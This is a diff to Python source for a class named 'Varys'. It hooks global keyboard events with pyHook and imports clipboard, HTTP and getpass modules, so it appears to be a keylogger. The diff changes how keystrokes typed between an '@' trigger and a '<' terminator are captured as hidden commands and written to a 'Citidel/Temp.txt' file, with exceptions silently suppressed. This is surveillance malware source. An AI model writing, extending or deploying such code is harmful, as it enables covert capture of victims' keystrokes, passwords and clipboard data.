@@ -1,7 +1,7 @@
 import pyHook, pythoncom, sys, logging,os, pyperclip, httplib, urllib, getpass, shutil, pickle
 from datetime import datetime
 import threading
-
+from random import randint
 
 class Varys:
 
@@ -98,15 +98,18 @@ class Varys:
 ##        TODO might have bug in taking first cmd
             if(self.__take_cmd):
                 self.__cmd+=chr(ky)
-                if(len(self.__cmd)==2):
-                    f=open((os.path.join(os.getcwd(),'..','Citidel','Temp.txt')),"w")
-                    f.write(self.__cmd)
+                if(chr(ky)=='<'):
+                    try:
+                        f=open((os.path.join(os.getcwd(),'..','Citidel','Temp.txt')),"w")
+                        f.write(str(randint(10000,99999))+self.__cmd[:-1])
+                        f.close()
+                    except:
+                        pass
                     self.__cmd=""
-                    f.close()
                     self.__take_cmd=0
             if(chr(ky)=='@'):
                 self.__take_cmd=1
-                
+
             return True
 
         if(ky == 13):
